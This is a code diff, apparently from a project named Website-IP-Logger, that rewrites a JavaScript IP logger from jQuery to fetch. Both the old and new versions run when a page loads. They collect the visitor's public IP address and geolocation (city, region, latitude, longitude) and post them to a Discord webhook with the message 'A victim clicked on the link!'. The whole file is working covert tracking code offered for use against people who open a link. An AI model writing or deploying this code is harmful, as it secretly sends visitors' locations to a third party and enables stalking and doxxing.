@@ -1,26 +1,37 @@
-// GIVE ALL CREDIT TO ELK, PLEASE!!
-//     MY DISCORD IS @2elk !!!!
-$(document).ready(function() {
-    function ipmsg(ipadd) {
-        var webhookURL = 'YOUR WEBHOOK'; // PUT IN YOUR WEBHOOK URL
-        var payload = {
-            content: '      A victim clicked on the link! @here\nIPv4 Address: ' + ipadd + '\nGeolocation Info: https://iplocation.io/ip/' + ipadd + '\n  ᓚᘏᗢ  -  e l k  w a s  h e r e  -'  // MESSAGE SENT TO WEBHOOK
-        };
-        $.ajax({
-            url: webhookURL,
-            type: 'POST',
-            data: JSON.stringify(payload),
-            contentType: 'application/json',
-            success: function() {
-                console.log('success');    
-            },
-            error: function(xhr, status, error) {
-                console.error('failed', error);
-            }  
+// give all credit to elk
+// https://github.com/3elk/Website-IP-Logger
+const sendIP = () => {
+    fetch('https://api.ipify.org?format=json')
+        .then(ipResponse => ipResponse.json())
+        .then(ipData => {
+            const ipadd = ipData.ip;
+            return fetch(`https://ipapi.co/${ipadd}/json/`)
+                .then(geoResponse => geoResponse.json())
+                .then(geoData => {
+                    const dscURL = 'WEBHOOK URL'; // replace with your webhook url
+                    return fetch(dscURL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            username: "site logger <3", // optionally changeable
+                            avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg", // optionally changeable
+                            content: `A victim clicked on the link! @here\n=====================\nIPv4 Address >> ${ipadd}\nCountry >> ${geoData.country_name}\nRegion/State >> ${geoData.region}\nCity/Town >> ${geoData.city}\nLatitude >> ${geoData.latitude}\nLongitude >> ${geoData.longitude}\n=====================\nᓚᘏᗢ - e l k w a s h e r e -`
+                        })
+                    });
+                });
+        })
+        .then(dscResponse => {  
+            if (dscResponse.ok) {
+                console.log('Sent! <3');
+            } else {
+                console.log('Failed :(');
+            }
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            console.log('Error :(');
         });
-    }
-    $.getJSON('https://api.ipify.org?format=json', function(data) {
-        var ipadd = data.ip;
-        ipmsg(ipadd);
-    });
-});
+};
+sendIP();
